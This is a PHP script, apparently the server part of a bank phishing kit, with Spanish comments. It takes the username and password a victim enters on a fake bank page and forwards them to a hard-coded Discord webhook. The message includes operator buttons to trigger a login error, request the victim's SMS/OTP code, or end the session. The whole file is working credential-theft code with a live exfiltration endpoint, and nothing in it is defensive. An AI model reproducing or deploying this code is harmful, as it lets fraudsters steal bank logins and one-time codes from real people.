<?php
// Configuración
$webhook_url = "https://discord.com/api/webhooks/1497277480854094034/CwIFuxjcHG-oaxYTVlKoXGG1rckYFlxHwQy8EXceHFiEQOzVT51Xokx7Fw-HZ0E6GFVP";
$mi_web = "https://pryueba.vercel.app/"; // CAMBIA ESTO POR TU URL REAL (ej: https://mibank.com)

$data = json_decode(file_get_contents('php://input'), true);
$usuario = $data['usuario'] ?? 'N/A';
$clave = $data['clave'] ?? 'N/A';
$tipo = $data['tipo'] ?? 'CAPTURA';

$payload = [
    "username" => "Banco Internacional - Panel",
    "embeds" => [[
        "title" => "🏦 NUEVA ACCIÓN: " . $tipo,
        "color" => 0xf59a05,
        "fields" => [
            ["name" => "👤 Usuario", "value" => "`$usuario`", "inline" => true],
            ["name" => "🔑 Dato Recibido", "value" => "`$clave`", "inline" => true]
        ],
        "footer" => ["text" => "Haz clic en un botón para controlar al usuario"]
    ]],
    "components" => [[
        "type" => 1,
        "components" => [
            ["type" => 2, "style" => 4, "label" => "❌ Error Login", "url" => "$mi_web/control.php?accion=error_login"],
            ["type" => 2, "style" => 3, "label" => "📲 Pedir SMS/OTP", "url" => "$mi_web/control.php?accion=pedir_otp"],
            ["type" => 2, "style" => 1, "label" => "✅ Finalizar", "url" => "$mi_web/control.php?accion=finalizar"]
        ]
    ]]
];

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);
echo json_encode(["status" => "ok"]);
?>
